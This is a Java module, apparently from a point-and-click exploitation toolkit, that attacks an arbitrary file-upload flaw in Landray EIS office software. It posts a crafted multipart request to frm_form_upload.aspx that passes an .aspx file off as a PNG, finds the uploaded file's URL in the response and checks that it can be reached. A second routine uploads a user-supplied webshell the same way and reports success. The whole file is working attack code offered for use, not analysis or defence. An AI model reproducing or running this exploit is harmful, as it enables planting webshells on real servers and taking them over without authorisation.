package exp.oa.landrayoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;
import utils.Methods;

import java.util.HashMap;

public class landray_eis_FrmFormUpload_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd,textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String frmform(String url,String filename, String payload) {
        try {
            HttpTools post_res = new HttpTools();
            HashMap<String, String> head = new HashMap<>();
            head.put("Cookie","ASP.NET_SessionId=fqq0ks45w4yqpev52l3adnet; FIOA_IMG_FOLDER=FI; Lang=zh-cn");
            head.put("Content-Type", "multipart/form-data; boundary=---------------------------kjivps8atzygowgnvjwo");

            String data1 = "-----------------------------kjivps8atzygowgnvjwo\r\n" +
                    "Content-Disposition: form-data; name=\"__VIEWSTATE\"\r\n" +
                    "\r\n" +
                    "/wEPDwUKMTgyMDI2MjI1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUG5L+d5a2YZGRkBUW9Q0DcNX2v8bIwXTLagEBcnZQ=\r\n" +
                    "-----------------------------kjivps8atzygowgnvjwo\r\n" +
                    "Content-Disposition: form-data; name=\"__EVENTTARGET\"\r\n" +
                    "\r\n" +
                    "GB_SAVE\r\n" +
                    "-----------------------------kjivps8atzygowgnvjwo\r\n" +
                    "Content-Disposition: form-data; name=\"__EVENTARGUMENT\"\r\n" +
                    "\r\n" +
                    "保存\r\n" +
                    "-----------------------------kjivps8atzygowgnvjwo\r\n" +
                    "Content-Disposition: form-data; name=\"tpfile\"; filename=\"" + filename + "\"\r\n" +
                    "Content-Type: image/png\r\n" +
                    "\r\n" +
                    payload +
                    "\r\n" +
                    "-----------------------------kjivps8atzygowgnvjwo--";
            Response post_resp = post_res.post(url + "/frm/frm_form_upload.aspx", data1, head, "utf-8");
            if(post_resp.getText().contains("updateOpenerImg")&& post_resp.getCode()==200){
                String var = post_resp.getText();
                String var1 = getIndexOf.getMessage_useStr(var,"window.opener){ updateOpenerImg",0,"</HTML>",0);
                String var2 = var1.substring(var1.indexOf("updateOpenerImg")+17,var1.indexOf("window.returnValue")-13);
                return url+"/frm/"+var2;
            }

        }catch (Exception e){

        }
        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try {

            String payload = "Hello R4g";
            String filename = Methods.R4gPayload("T", "aspx");
            String result = frmform(url,filename,payload);
            Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
            if ( result!=null&&get.getCode()==200) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ landray_eis_FrmFormUpload_upload ]");

                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }

        return false;
    }


    private boolean attcmd(String url,String pass,TextArea textArea,TextArea textArea_cmd){
        try {


            String shell_payload = Methods.readFile(pass);
            String filename = Methods.R4gPayload("S", "aspx");
            String result = frmform(url,filename,shell_payload);
            Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
            if ( result!=null&&get.getCode()==200) {

                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: ----"+result);
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }

        return false;
    }
}
